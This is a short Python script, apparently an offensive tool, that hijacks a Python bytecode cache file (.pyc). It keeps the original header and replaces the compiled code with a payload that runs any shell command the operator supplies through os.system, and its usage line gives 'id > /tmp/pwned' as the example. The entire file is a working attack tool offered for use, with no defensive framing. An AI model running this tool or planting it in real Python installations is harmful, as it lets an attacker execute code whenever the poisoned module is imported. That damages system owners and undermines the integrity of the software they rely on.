#!/usr/bin/env python3
import marshal
import struct
import sys

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target.pyc> <command>")
        print(f"Example: {sys.argv[0]} helper.cpython-310.pyc 'id > /tmp/pwned'")
        sys.exit(1)

    fn = sys.argv[1]
    cmd = " ".join(sys.argv[2:])

    # Read original .pyc header
    with open(fn, "rb") as f:
        magic = f.read(4)
        flags = f.read(4)
        timestamp = f.read(8)

    # Build payload from the supplied command
    payload = f"import os\nos.system({cmd!r})\n"

    # Compile and serialize
    code_obj = compile(payload, "<pyc-hijack>", "exec")
    code_bytes = marshal.dumps(code_obj)

    # Overwrite the .pyc with preserved header + malicious bytecode
    with open(fn, "wb") as f:
        f.write(magic + flags + timestamp + code_bytes)

    print(f"[+] Hijacked {fn} with payload: {cmd}")

if __name__ == "__main__":
    main()
